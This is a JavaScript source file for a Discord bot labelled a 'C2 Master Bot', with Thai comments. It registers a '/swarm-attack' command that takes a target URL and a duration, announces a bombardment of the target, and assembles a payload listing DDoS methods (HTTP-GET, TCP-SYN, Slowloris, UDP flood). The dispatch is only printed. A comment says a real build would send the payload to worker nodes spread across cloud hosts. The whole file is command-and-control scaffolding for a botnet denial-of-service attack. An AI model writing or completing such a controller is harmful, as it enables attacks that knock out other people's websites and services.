const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', async () => {
    console.log(`[+] C2 Master Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการฝูงบอทแสนตัวระดมยิงเป้าหมายทุกรูปแบบ')
            .addStringOption(option =>
                option.setName('target')
                    .setDescription('URL เป้าหมาย')
                    .setRequired(true))
            .addIntegerOption(option =>
                option.setName('duration')
                    .setDescription('ระยะเวลา (วินาที)')
                    .setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('[+] Swarm commands registered.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        await interaction.reply(`[☠️] ส่งสัญญาณคำสั่งไปยัง Node เครือข่ายทั้งหมด ถล่มใส่ ${target} เป็นเวลา ${duration} วินาที!`);

        // จำลองการยิงกระจายจากหลายโหนดพร้อมกันด้วย Multi-Vector Payload
        const payload = {
            target: target,
            duration: duration,
            methods: ['HTTP-GET', 'TCP-SYN', 'SLOWLORIS', 'UDP-FLOOD']
        };

        // ในระบบจริง ตรงนี้จะยิง API ไปหา Worker Nodes ที่กระจายอยู่ตาม Cloud ต่างๆ (เช่น AWS, Render, Railway)
        console.log('[*] Dispatching payload to worker pool:', payload);
    }
});

client.login(process.env.DISCORD_TOKEN);
